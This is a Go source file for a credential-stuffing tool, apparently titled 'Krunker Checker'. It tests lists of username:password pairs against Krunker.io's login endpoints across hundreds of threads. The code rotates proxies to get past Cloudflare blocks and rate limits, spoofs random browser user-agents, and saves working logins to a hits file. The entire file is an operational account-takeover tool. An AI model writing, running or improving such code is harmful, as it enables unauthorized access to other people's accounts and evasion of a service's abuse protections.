package services

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorCyan   = "\033[36m"
	ColorGray   = "\033[90m"
	ColorPurple = "\033[35m"
	ColorBold   = "\033[1m"
)

const (
	uu1    = "https://gapi.svc.krunker.io/auth/login/username"
	email1 = "https://gapi.svc.krunker.io/auth/login/email"
	origin = "https://krunker.io/"
)

var (
	c1      = []string{"119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0", "115.0.0.0"}
	c2      = []string{"119.0", "118.0", "117.0", "116.0", "115.0"}
	c3      = []string{"119.0.0.0", "118.0.0.0", "117.0.0.0"}
	window1 = []string{"Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64"}
	rng     = rand.New(rand.NewSource(time.Now().UnixNano()))
)

type LoginRequest struct {
	Username string `json:"username,omitempty"`
	Email    string `json:"email,omitempty"`
	Password string `json:"password"`
}

type Account struct {
	Username string
	Password string
	Status   string
}

type LoginResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Data    struct {
		Token    string `json:"token"`
		Username string `json:"username"`
		UserID   string `json:"user_id"`
	} `json:"data"`
}

type ProxyManager struct {
	activeProxies     []string
	shelvedProxies    map[string]bool
	removedProxies    map[string]bool
	currentIndex      int
	mu                sync.Mutex
	initialProxyCount int
}

var proxyManager *ProxyManager
var fileMutex sync.Mutex

type LiveCounters struct {
	Valid        int64
	Migrate      int64
	Verification int64
	AgeGate      int64
	Bad          int64
	Undetermined int64
	Checked      int64
	startTime    time.Time
}

func tcount() int {
	fmt.Print(ColorCyan + "threads (default 500): " + ColorReset)

	var input string
	fmt.Scanln(&input)

	if input == "" {
		return 500
	}

	threads, err := strconv.Atoi(input)
	if err != nil || threads <= 0 {
		fmt.Printf(ColorRed + "Invalid input, using default 500 threads\n" + ColorReset)
		return 500
	}

	if threads > 1000 {
		fmt.Printf(ColorYellow+"Warning: Using %d threads might be too aggressive\n"+ColorReset, threads)
	}

	return threads
}

func sexyagent() string {
	browsers := []string{"chrome", "firefox", "edge"}
	browser := browsers[rng.Intn(len(browsers))]

	switch browser {
	case "chrome":
		return m1()
	case "firefox":
		return m2()
	case "edge":
		return m3()
	default:
		return m1()
	}
}

func m1() string {
	version := c1[rng.Intn(len(c1))]
	osString := window1[rng.Intn(len(window1))]
	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", osString, version)
}
func m2() string {
	version := c2[rng.Intn(len(c2))]
	osString := "Windows NT 10.0; Win64; x64"
	return fmt.Sprintf("Mozilla/5.0 (%s; rv:109.0) Gecko/20100101 Firefox/%s", osString, version)
}
func m3() string {
	version := c3[rng.Intn(len(c3))]
	osString := window1[rng.Intn(len(window1))]
	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", osString, version, version)
}
func updateStatus(counters *LiveCounters, totalAccounts int, numThreads int, wg *sync.WaitGroup, stop chan struct{}) {
	defer wg.Done()
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			statusp(counters, totalAccounts, numThreads)
		}
	}
}

func statusp(counters *LiveCounters, totalAccounts int, numThreads int) {
	fmt.Print("\033[H\033[2J")

	checked := atomic.LoadInt64(&counters.Checked)
	valid := atomic.LoadInt64(&counters.Valid)
	migrate := atomic.LoadInt64(&counters.Migrate)
	verification := atomic.LoadInt64(&counters.Verification)
	ageGate := atomic.LoadInt64(&counters.AgeGate)
	bad := atomic.LoadInt64(&counters.Bad)

	proxyManager.mu.Lock()
	activeProxies := len(proxyManager.activeProxies)
	badProxies := len(proxyManager.removedProxies) + len(proxyManager.shelvedProxies)
	proxyManager.mu.Unlock()
	elapsed := time.Since(counters.startTime)
	var cpm int64
	if elapsed.Minutes() > 0 {
		cpm = int64(float64(checked) / elapsed.Minutes())
	}
	var avgTimePerCheck string
	if checked > 0 {
		avgMs := elapsed.Milliseconds() / checked
		avgTimePerCheck = fmt.Sprintf("%dms", avgMs)
	} else {
		avgTimePerCheck = "0ms"
	}

	fmt.Printf("%sKrunker Checker - @cleanest%s | Checking %s%s%s accounts (%s%d%s threads), %s%d%s CPM)\n\n",
		ColorBold, ColorReset,
		ColorCyan, formatNumber(totalAccounts), ColorReset,
		ColorCyan, numThreads, ColorReset,
		ColorCyan, cpm, ColorReset)

	fmt.Printf("%sHits:%s > %s%s%s\n",
		ColorGreen, ColorReset, ColorGreen, formatNumber(int(valid)), ColorReset)
	fmt.Printf("%sMigrate:%s > %s%s%s\n",
		ColorYellow, ColorReset, ColorYellow, formatNumber(int(migrate)), ColorReset)
	fmt.Printf("%sVerify:%s > %s%s%s\n",
		ColorPurple, ColorReset, ColorPurple, formatNumber(int(verification)), ColorReset)
	fmt.Printf("%sBanned:%s > %s%s%s\n",
		ColorGray, ColorReset, ColorGray, formatNumber(int(ageGate)), ColorReset)
	fmt.Printf("%sBad:%s > %s%s%s\n\n",
		ColorRed, ColorReset, ColorRed, formatNumber(int(bad)), ColorReset)

	fmt.Printf("%sProxies:%s %s%d%s/%s%d%s\n",
		ColorCyan, ColorReset, ColorGreen, activeProxies, ColorReset, ColorRed, badProxies, ColorReset)

	hours := int(elapsed.Hours())
	minutes := int(elapsed.Minutes()) % 60
	seconds := int(elapsed.Seconds()) % 60
	timeStr := fmt.Sprintf("%02d:%02d:%02d", hours, minutes, seconds)

	fmt.Printf("%sTime elapsed:%s %s\n", ColorCyan, ColorReset, timeStr)
	fmt.Printf("%sAverage time per check:%s %s\n\n", ColorCyan, ColorReset, avgTimePerCheck)
	fmt.Printf("%s(Ctrl+C to quit)%s", ColorGray, ColorReset)
}

func formatNumber(n int) string {
	str := strconv.Itoa(n)
	if len(str) <= 3 {
		return str
	}
	var result []string
	for i, char := range str {
		if i > 0 && (len(str)-i)%3 == 0 {
			result = append(result, ",")
		}
		result = append(result, string(char))
	}
	return strings.Join(result, "")
}

func gudproxies() error {
	proxyManager.mu.Lock()
	defer proxyManager.mu.Unlock()

	goodProxies := make(map[string]bool)
	for _, p := range proxyManager.activeProxies {
		goodProxies[p] = true
	}
	for p := range proxyManager.shelvedProxies {
		goodProxies[p] = true
	}
	var finalProxyList []string
	for p := range goodProxies {
		cleanProxy := strings.TrimPrefix(p, "http://")
		cleanProxy = strings.TrimPrefix(cleanProxy, "https://")
		cleanProxy = strings.TrimPrefix(cleanProxy, "socks5://")
		finalProxyList = append(finalProxyList, cleanProxy)
	}
	content := strings.Join(finalProxyList, "\n")
	err := os.WriteFile("data/proxies.txt", []byte(content), 0644)
	if err != nil {
		return fmt.Errorf("could not write cleaned proxies file: %w", err)
	}
	fmt.Printf(ColorCyan + "\nSuccessfully cleaned and updated proxies.txt. Bad proxies removed.\n" + ColorReset)
	return nil
}

func ProcessAccounts() error {
	if err := initp(); err != nil {
		return fmt.Errorf("failed to initialize proxy manager: %w", err)
	}
	if err := os.MkdirAll("results", 0755); err != nil {
		return fmt.Errorf("failed to create results: %w", err)
	}
	accounts, err := readAccountsFile("data/accounts.txt")
	if err != nil {
		return fmt.Errorf("failed to read accounts file: %w", err)
	}

	if len(accounts) == 0 {
		return fmt.Errorf("no accounts found in data/accounts.txt")
	}
	numWorkers := tcount()
	fmt.Print("\033[2A\033[K")

	counters := &LiveCounters{
		startTime: time.Now(),
	}
	accountChan := make(chan Account, len(accounts))
	var wg sync.WaitGroup
	var statusWg sync.WaitGroup
	stopStatus := make(chan struct{})
	statusWg.Add(1)
	go updateStatus(counters, len(accounts), numWorkers, &statusWg, stopStatus)
	for _, account := range accounts {
		accountChan <- account
	}
	close(accountChan)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			pro(workerID, accountChan, counters)
		}(i)
	}
	wg.Wait()
	time.Sleep(300 * time.Millisecond)
	close(stopStatus)
	statusWg.Wait()
	if err := gudproxies(); err != nil {
		fmt.Printf(ColorRed+"Error updating proxies.txt: %v\n"+ColorReset, err)
	}
	return nil
}

func pro(_ int, accountChan <-chan Account, counters *LiveCounters) {
	const maxAccountRetries = 20
	for account := range accountChan {
		var status string
		var proxy string
		var err error
		var success bool

		for i := 0; i < maxAccountRetries; i++ {
			proxy = proxyManager.getNextProxy()
			if proxy == "" {
				break
			}
			status, _, err = http1(account, proxy)

			if err != nil {
				errMsg := err.Error()
				if strings.Contains(errMsg, "cloudflare") {
					proxyManager.removeProxy(proxy)
				} else if strings.Contains(errMsg, "rate limit exceeded") {
					proxyManager.shelveProxy(proxy)
				}
				continue
			}
			success = true
			break
		}

		atomic.AddInt64(&counters.Checked, 1)

		if !success {
			app1("results/undetermined.txt", account)
			atomic.AddInt64(&counters.Undetermined, 1)
			continue
		}
		account.Status = status
		switch status {
		case "login_ok":
			app1("results/login_ok.txt", account)
			atomic.AddInt64(&counters.Valid, 1)
		case "needs_migrate":
			app1("results/needs_migrate.txt", account)
			atomic.AddInt64(&counters.Migrate, 1)
		case "needs_verification":
			app1("results/needs_verification.txt", account)
			atomic.AddInt64(&counters.Verification, 1)
		case "needs_age_gate":
			app1("results/banned.txt", account)
			atomic.AddInt64(&counters.AgeGate, 1)
		default:
			app1("results/bad_accounts.txt", account)
			atomic.AddInt64(&counters.Bad, 1)
		}
	}
}

func app1(filename string, account Account) error {
	fileMutex.Lock()
	defer fileMutex.Unlock()
	return appendAccountToFile(filename, account)
}
func appendAccountToFile(filename string, account Account) error {
	dir := filepath.Dir(filename)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open file for appending: %w", err)
	}
	defer file.Close()
	line := fmt.Sprintf("%s:%s\n", account.Username, account.Password)
	if _, err := file.WriteString(line); err != nil {
		return fmt.Errorf("failed to write account: %w", err)
	}
	if err := file.Sync(); err != nil {
		return fmt.Errorf("failed to sync file: %w", err)
	}
	return nil
}

func http1(account Account, proxyURL string) (string, string, error) {
	var loginReq LoginRequest
	var targetURL string
	if strings.Contains(account.Username, "@") && strings.Contains(account.Username, ".") {
		loginReq = LoginRequest{
			Email:    account.Username,
			Password: account.Password,
		}
		targetURL = email1
	} else {
		loginReq = LoginRequest{
			Username: account.Username,
			Password: account.Password,
		}
		targetURL = uu1
	}

	jsonData, err := json.Marshal(loginReq)
	if err != nil {
		return "", "", fmt.Errorf("failed to marshal login request: %w", err)
	}
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", "", fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", sexyagent())
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", "https://krunker.io/")

	client := createHTTPClient(proxyURL)
	resp, err := client.Do(req)
	if err != nil {
		return "", "", fmt.Errorf("request failed: %w (proxy: %s)", err, proxyURL)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", fmt.Errorf("failed to read response body: %w", err)
	}
	bodyStr := string(body)
	if strings.Contains(bodyStr, "Cloudflare") && strings.Contains(bodyStr, "Sorry, you have been blocked") {
		return "", bodyStr, fmt.Errorf("cloudflare block")
	}
	if strings.Contains(bodyStr, "Rate limit exceeded") || strings.Contains(bodyStr, "Too Many Requests") {
		return "", bodyStr, fmt.Errorf("rate limit exceeded")
	}

	if strings.Contains(bodyStr, "\"login_ok\"") {
		return "login_ok", bodyStr, nil
	}
	if strings.Contains(bodyStr, "\"ensure_migrated\"") {
		return "needs_migrate", bodyStr, nil
	}
	if strings.Contains(bodyStr, "\"kid_age_gate\"") {
		return "needs_age_gate", bodyStr, nil
	}
	if strings.Contains(bodyStr, "\"ensure_verified\"") {
		return "needs_verification", bodyStr, nil
	}
	if strings.Contains(bodyStr, "password incorrect") || strings.Contains(bodyStr, "bad credentials err") || strings.Contains(bodyStr, "provided password needs to be at least 8 characters") {
		return "password_incorrect", bodyStr, nil
	}
	if strings.Contains(bodyStr, "username incorrect") || strings.Contains(bodyStr, "email not found") {
		return "username_incorrect", bodyStr, nil
	}
	if strings.Contains(bodyStr, "invalid account or password") {
		return "invalid", bodyStr, nil
	}
	return "unknown", bodyStr, nil
}

func readAccountsFile(filename string) ([]Account, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file %s: %w", filename, err)
	}
	defer file.Close()
	var accounts []Account
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.Contains(line, "=") {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) < 2 {
			continue
		}
		accounts = append(accounts, Account{
			Username: strings.TrimSpace(parts[0]),
			Password: strings.TrimSpace(strings.Join(parts[1:], ":")),
		})
	}
	return accounts, scanner.Err()
}

func initp() error {
	proxies, err := readp("data/proxies.txt")
	if err != nil {
		return fmt.Errorf("failed to read proxies.txt: %w", err)
	}
	if len(proxies) == 0 {
		return fmt.Errorf("no valid proxies found in proxies.txt")
	}
	proxyManager = &ProxyManager{
		activeProxies:     proxies,
		shelvedProxies:    make(map[string]bool),
		removedProxies:    make(map[string]bool),
		currentIndex:      -1,
		initialProxyCount: len(proxies),
	}
	return nil
}

func (pm *ProxyManager) getNextProxy() string {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	if len(pm.activeProxies) == 0 {
		return ""
	}
	pm.currentIndex = (pm.currentIndex + 1) % len(pm.activeProxies)
	return pm.activeProxies[pm.currentIndex]
}

func (pm *ProxyManager) removeProxy(proxyToRemove string) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	if pm.removedProxies[proxyToRemove] {
		return
	}
	newActiveProxies := []string{}
	for _, p := range pm.activeProxies {
		if p != proxyToRemove {
			newActiveProxies = append(newActiveProxies, p)
		}
	}
	pm.activeProxies = newActiveProxies
	pm.removedProxies[proxyToRemove] = true
	pm.currentIndex = -1
}

func (pm *ProxyManager) shelveProxy(proxyToShelve string) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	if pm.shelvedProxies[proxyToShelve] {
		return
	}
	newActiveProxies := []string{}
	for _, p := range pm.activeProxies {
		if p != proxyToShelve {
			newActiveProxies = append(newActiveProxies, p)
		}
	}
	pm.activeProxies = newActiveProxies
	pm.shelvedProxies[proxyToShelve] = true
	pm.currentIndex = -1
}

func createHTTPClient(proxyURL string) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout: 5 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout: 5 * time.Second,
	}
	if proxyURL != "" {
		if proxy, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxy)
		}
	}
	return &http.Client{
		Transport: transport,
		Timeout:   7 * time.Second,
	}
}

func readp(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.Contains(line, "=") {
			continue
		}
		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") && !strings.HasPrefix(line, "socks5://") {
			line = "http://" + line
		}
		proxies = append(proxies, line)
	}
	return proxies, scanner.Err()
}

